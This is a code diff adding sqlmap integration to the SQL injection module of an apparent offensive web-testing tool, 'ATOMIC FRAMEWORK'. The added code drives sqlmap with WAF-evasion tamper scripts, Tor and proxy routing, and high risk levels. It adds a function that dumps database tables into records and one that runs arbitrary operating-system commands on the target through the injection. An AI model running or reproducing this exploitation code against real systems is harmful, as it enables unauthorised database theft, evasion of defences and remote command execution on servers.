@@ -3,9 +3,17 @@
 """
 ATOMIC FRAMEWORK - SQL Injection Module
 Advanced SQLi detection and exploitation
+
+Includes native detection techniques and optional sqlmap CLI integration
+for deeper automated exploitation when sqlmap is installed on the system.
 """
 
+import json
+import os
 import re
+import shutil
+import subprocess
+import tempfile
 import time
 
 
@@ -81,6 +89,10 @@ class SQLiModule:
         
         # Test WAF bypass payloads
         self._test_waf_bypass_payloads(url, method, param, value)
+
+        # sqlmap deep scan (optional, requires sqlmap installed)
+        if self.engine.config.get('modules', {}).get('sqlmap', False):
+            self._test_sqlmap(url, method, param, value)
     
     def test_url(self, url: str):
         """Test URL for SQLi"""
@@ -414,7 +426,414 @@ class SQLiModule:
             except Exception as e:
                 if self.engine.config.get('verbose'):
                     print(f"{Colors.error(f'WAF bypass SQLi test error: {e}')}")
-    
+
+    # ------------------------------------------------------------------
+    # sqlmap CLI integration
+    # ------------------------------------------------------------------
+
+    @staticmethod
+    def _find_sqlmap() -> str:
+        """Return the sqlmap executable path or empty string if not found."""
+        # Check PATH first
+        path = shutil.which('sqlmap')
+        if path:
+            return path
+        # Common installation directories
+        for candidate in [
+            '/usr/bin/sqlmap', '/usr/local/bin/sqlmap',
+            '/usr/share/sqlmap/sqlmap.py',
+            os.path.expanduser('~/.local/bin/sqlmap'),
+            os.path.expanduser('~/sqlmap/sqlmap.py'),
+        ]:
+            if os.path.isfile(candidate) and os.access(candidate, os.X_OK):
+                return candidate
+        # Try as Python module
+        for candidate in [
+            os.path.expanduser('~/sqlmap/sqlmap.py'),
+            '/usr/share/sqlmap/sqlmap.py',
+            '/opt/sqlmap/sqlmap.py',
+        ]:
+            if os.path.isfile(candidate):
+                return candidate
+        return ''
+
+    def _test_sqlmap(self, url: str, method: str, param: str, value: str):
+        """Run sqlmap against a specific parameter for deep SQL injection testing.
+
+        sqlmap is executed as a subprocess with ``--batch`` (non-interactive)
+        and ``--output-dir`` pointing to a temporary directory.  Results are
+        parsed from the JSON/CSV output and converted into Findings.
+
+        Gracefully skips if sqlmap is not installed.
+        """
+        sqlmap_bin = self._find_sqlmap()
+        if not sqlmap_bin:
+            if self.engine.config.get('verbose'):
+                print(f"{Colors.warning('sqlmap not found — skipping sqlmap integration')}")
+            return
+
+        results = self.sqlmap_scan(
+            url, param, method=method, value=value,
+            sqlmap_bin=sqlmap_bin,
+            extra_args=self._build_sqlmap_extra_args(),
+        )
+        for r in results:
+            from core.engine import Finding
+            self.engine.add_finding(Finding(**r))
+
+    def _build_sqlmap_extra_args(self) -> list:
+        """Build extra sqlmap CLI arguments from engine config."""
+        args = []
+        proxy = self.engine.config.get('proxy')
+        if proxy:
+            args.extend(['--proxy', proxy])
+        if self.engine.config.get('tor'):
+            args.append('--tor')
+        timeout = self.engine.config.get('timeout', 15)
+        args.extend(['--timeout', str(timeout)])
+        evasion = self.engine.config.get('evasion', 'none')
+        if evasion in ('high', 'insane'):
+            args.extend(['--tamper', 'between,randomcase,space2comment'])
+            args.extend(['--level', '5', '--risk', '3'])
+        elif evasion == 'medium':
+            args.extend(['--tamper', 'space2comment'])
+            args.extend(['--level', '3', '--risk', '2'])
+        else:
+            args.extend(['--level', '2', '--risk', '1'])
+        return args
+
+    def sqlmap_scan(self, url: str, param: str, *,
+                    method: str = 'GET', value: str = '',
+                    sqlmap_bin: str = '', extra_args: list = None,
+                    timeout: int = 120) -> list:
+        """Execute sqlmap and return a list of Finding-compatible dicts.
+
+        Parameters
+        ----------
+        url : str
+            Target URL.
+        param : str
+            Parameter to test.
+        method : str
+            HTTP method (GET or POST).
+        value : str
+            Current parameter value (used to build the target URL).
+        sqlmap_bin : str
+            Path to the sqlmap binary.  Auto-detected if empty.
+        extra_args : list
+            Additional CLI arguments forwarded to sqlmap.
+        timeout : int
+            Maximum seconds to wait for sqlmap to finish.
+
+        Returns
+        -------
+        list[dict]
+            Each dict is suitable for ``Finding(**d)``.
+        """
+        if not sqlmap_bin:
+            sqlmap_bin = self._find_sqlmap()
+        if not sqlmap_bin:
+            return []
+
+        findings = []
+        tmpdir = tempfile.mkdtemp(prefix='atomic_sqlmap_')
+
+        try:
+            # Build the target URL with the parameter
+            if method.upper() == 'GET':
+                separator = '&' if '?' in url else '?'
+                target_url = f"{url}{separator}{param}={value}"
+                cmd = [sqlmap_bin, '-u', target_url, '-p', param]
+            else:
+                target_url = url
+                cmd = [
+                    sqlmap_bin, '-u', target_url,
+                    '--data', f'{param}={value}',
+                    '-p', param,
+                    '--method', method.upper(),
+                ]
+
+            cmd.extend([
+                '--batch',               # non-interactive
+                '--output-dir', tmpdir,  # output to temp dir
+                '--flush-session',       # fresh session
+                '--smart',               # smart mode
+                '--threads', '4',
+            ])
+
+            if extra_args:
+                cmd.extend(extra_args)
+
+            # If sqlmap_bin ends with .py, prepend python interpreter
+            if sqlmap_bin.endswith('.py'):
+                cmd = ['python3', *cmd]
+
+            if self.engine.config.get('verbose'):
+                cmd_preview = ' '.join(cmd[:6])
+                print(f"{Colors.info(f'Running sqlmap: {cmd_preview}...')}")
+
+            proc = subprocess.run(
+                cmd,
+                capture_output=True,
+                text=True,
+                timeout=timeout,
+            )
+
+            output = proc.stdout + proc.stderr
+            findings = self._parse_sqlmap_output(output, url, param)
+
+            # Also try to parse log files in output dir
+            findings.extend(self._parse_sqlmap_log_dir(tmpdir, url, param))
+
+        except subprocess.TimeoutExpired:
+            if self.engine.config.get('verbose'):
+                print(f"{Colors.warning('sqlmap timed out')}")
+        except FileNotFoundError:
+            if self.engine.config.get('verbose'):
+                print(f"{Colors.warning('sqlmap binary not found at execution time')}")
+        except Exception as e:
+            if self.engine.config.get('verbose'):
+                print(f"{Colors.error(f'sqlmap error: {e}')}")
+        finally:
+            # Clean up temp directory
+            try:
+                import shutil as _shutil
+                _shutil.rmtree(tmpdir, ignore_errors=True)
+            except Exception:
+                pass
+
+        return findings
+
+    def _parse_sqlmap_output(self, output: str, url: str, param: str) -> list:
+        """Parse sqlmap stdout/stderr for injection confirmations."""
+        findings = []
+
+        # Detect confirmed injection types from sqlmap output
+        injection_patterns = [
+            (r'Type:\s*(\w[\w\s\-]+)', 'technique'),
+            (r'Title:\s*(.+)', 'title'),
+            (r'Payload:\s*(.+)', 'payload'),
+        ]
+
+        current = {}
+        for line in output.splitlines():
+            line = line.strip()
+            for pattern, key in injection_patterns:
+                match = re.search(pattern, line, re.IGNORECASE)
+                if match:
+                    current[key] = match.group(1).strip()
+                    break
+
+            # When we have a complete set, emit a finding
+            if 'technique' in current and 'payload' in current:
+                technique = current.get('technique', 'Unknown')
+                title = current.get('title', technique)
+                payload = current.get('payload', '')
+
+                severity = 'CRITICAL'
+                if 'time-based' in technique.lower() or 'blind' in technique.lower():
+                    severity = 'HIGH'
+
+                findings.append({
+                    'technique': f"SQL Injection (sqlmap: {title})",
+                    'url': url,
+                    'severity': severity,
+                    'confidence': 0.95,
+                    'param': param,
+                    'payload': payload,
+                    'evidence': f"sqlmap confirmed: {technique}",
+                })
+                current = {}
+
+        # Check for database type detection
+        db_match = re.search(
+            r'back-end DBMS:\s*(.+)', output, re.IGNORECASE,
+        )
+        if db_match and not findings:
+            findings.append({
+                'technique': f"SQL Injection (sqlmap: {db_match.group(1).strip()})",
+                'url': url,
+                'severity': 'HIGH',
+                'confidence': 0.90,
+                'param': param,
+                'payload': '',
+                'evidence': f"sqlmap detected DBMS: {db_match.group(1).strip()}",
+            })
+
+        return findings
+
+    def _parse_sqlmap_log_dir(self, tmpdir: str, url: str, param: str) -> list:
+        """Parse sqlmap's log directory for detailed results."""
+        findings = []
+        try:
+            from urllib.parse import urlparse
+            hostname = urlparse(url).hostname or 'unknown'
+            log_file = os.path.join(tmpdir, hostname, 'log')
+            if not os.path.isfile(log_file):
+                return findings
+
+            with open(log_file, 'r') as f:
+                content = f.read()
+
+            # Parse each injection block
+            blocks = re.split(r'---\n', content)
+            for block in blocks:
+                if 'Parameter:' not in block:
+                    continue
+                param_match = re.search(r'Parameter:\s*(.+)', block)
+                type_match = re.search(r'Type:\s*(.+)', block)
+                title_match = re.search(r'Title:\s*(.+)', block)
+                payload_match = re.search(r'Payload:\s*(.+)', block)
+
+                if type_match:
+                    technique = type_match.group(1).strip()
+                    title = title_match.group(1).strip() if title_match else technique
+                    payload = payload_match.group(1).strip() if payload_match else ''
+                    p_name = param_match.group(1).strip() if param_match else param
+
+                    findings.append({
+                        'technique': f"SQL Injection (sqlmap: {title})",
+                        'url': url,
+                        'severity': 'CRITICAL',
+                        'confidence': 0.95,
+                        'param': p_name,
+                        'payload': payload,
+                        'evidence': f"sqlmap log confirmed: {technique}",
+                    })
+        except Exception:
+            pass
+        return findings
+
+    def sqlmap_dump(self, url: str, param: str, *,
+                    method: str = 'GET', value: str = '',
+                    db: str = '', table: str = '',
+                    timeout: int = 300) -> list:
+        """Use sqlmap to dump database contents.
+
+        Returns a list of dicts extracted from the sqlmap CSV dump output.
+        """
+        sqlmap_bin = self._find_sqlmap()
+        if not sqlmap_bin:
+            return []
+
+        tmpdir = tempfile.mkdtemp(prefix='atomic_sqlmap_dump_')
+        results = []
+
+        try:
+            if method.upper() == 'GET':
+                separator = '&' if '?' in url else '?'
+                target_url = f"{url}{separator}{param}={value}"
+                cmd = [sqlmap_bin, '-u', target_url, '-p', param]
+            else:
+                cmd = [
+                    sqlmap_bin, '-u', url,
+                    '--data', f'{param}={value}',
+                    '-p', param,
+                ]
+
+            cmd.extend(['--batch', '--output-dir', tmpdir, '--threads', '4'])
+            cmd.append('--dump')
+
+            if db:
+                cmd.extend(['-D', db])
+            if table:
+                cmd.extend(['-T', table])
+
+            if sqlmap_bin.endswith('.py'):
+                cmd = ['python3', *cmd]
+
+            proc = subprocess.run(
+                cmd, capture_output=True, text=True, timeout=timeout,
+            )
+
+            # Parse CSV dump files from output dir
+            from urllib.parse import urlparse
+            hostname = urlparse(url).hostname or 'unknown'
+            dump_dir = os.path.join(tmpdir, hostname, 'dump')
+            if os.path.isdir(dump_dir):
+                for root, _dirs, files in os.walk(dump_dir):
+                    for fname in files:
+                        if fname.endswith('.csv'):
+                            fpath = os.path.join(root, fname)
+                            try:
+                                with open(fpath, 'r') as f:
+                                    lines = f.readlines()
+                                if len(lines) > 1:
+                                    headers = lines[0].strip().split(',')
+                                    for row in lines[1:]:
+                                        vals = row.strip().split(',')
+                                        entry = {}
+                                        for i, h in enumerate(headers):
+                                            entry[h] = vals[i] if i < len(vals) else ''
+                                        results.append(entry)
+                            except Exception:
+                                pass
+        except subprocess.TimeoutExpired:
+            if self.engine.config.get('verbose'):
+                print(f"{Colors.warning('sqlmap dump timed out')}")
+        except Exception as e:
+            if self.engine.config.get('verbose'):
+                print(f"{Colors.error(f'sqlmap dump error: {e}')}")
+        finally:
+            try:
+                import shutil as _shutil
+                _shutil.rmtree(tmpdir, ignore_errors=True)
+            except Exception:
+                pass
+
+        return results
+
+    def sqlmap_os_shell(self, url: str, param: str, command: str, *,
+                        method: str = 'GET', value: str = '',
+                        timeout: int = 120) -> str:
+        """Execute an OS command via sqlmap's --os-cmd feature.
+
+        Returns the command output or empty string on failure.
+        """
+        sqlmap_bin = self._find_sqlmap()
+        if not sqlmap_bin:
+            return ''
+
+        try:
+            if method.upper() == 'GET':
+                separator = '&' if '?' in url else '?'
+                target_url = f"{url}{separator}{param}={value}"
+                cmd = [sqlmap_bin, '-u', target_url, '-p', param]
+            else:
+                cmd = [
+                    sqlmap_bin, '-u', url,
+                    '--data', f'{param}={value}',
+                    '-p', param,
+                ]
+
+            cmd.extend(['--batch', '--os-cmd', command])
+
+            if sqlmap_bin.endswith('.py'):
+                cmd = ['python3', *cmd]
+
+            proc = subprocess.run(
+                cmd, capture_output=True, text=True, timeout=timeout,
+            )
+
+            # Extract command output from sqlmap stdout
+            output_lines = []
+            capture = False
+            for line in proc.stdout.splitlines():
+                if 'command standard output' in line.lower():
+                    capture = True
+                    continue
+                if capture:
+                    if line.strip() == '---':
+                        break
+                    output_lines.append(line)
+
+            return '\n'.join(output_lines).strip() if output_lines else proc.stdout
+
+        except subprocess.TimeoutExpired:
+            return ''
+        except Exception:
+            return ''
+
     def exploit_dump_database(self, url: str, param: str, db_type: str = 'mysql'):
         """Attempt to dump database"""
         print(f"{Colors.info(f'Attempting to dump {db_type} database...')}")
